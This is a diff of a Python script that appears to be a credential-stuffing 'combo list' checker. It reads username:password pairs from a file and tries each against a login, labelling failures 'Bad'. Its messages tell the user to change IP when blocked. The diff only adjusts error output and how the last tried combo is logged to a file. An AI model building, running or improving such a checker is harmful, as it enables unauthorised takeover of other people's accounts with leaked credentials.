@@ -28,9 +28,8 @@ def login(combo):
         f.write(r.text)
         f.close()
         return r.text
-    
     except:
-        print ("error: check your internet or change your ip and try again")
+        print ("[[error: check your internet or change your ip and try again]]")
 x=""
 def main(): 
     list = open(input("ComboList: "), "r").read().splitlines()
@@ -80,15 +79,16 @@ def main():
                 f.close()
         else:
             if "nginx" in login(combo):
-                last = open("last","a")
+                last = open("last.sz","a")
                 last.write(combo+"\n")
-                print ("error: check your internet or change your ip and try again")
-                if "name=" not in str(last):             
-                    print("Last Combo: "+str(last))
-                else:
-                    print("Last Combo: "+str(last))
-                    pass
                 last.close()
+                openlast = open("last.sz","r").read() 
+                print ("[[error: check your internet or change your ip and try again]]")
+                if "name=" not in openlast:             
+                    print("Last Combo: "+openlast)
+                else:
+                    print("Last Combo: "+openlast)
+                    pass                
                 return
             else:
                 print (combo+"  -----> Bad")
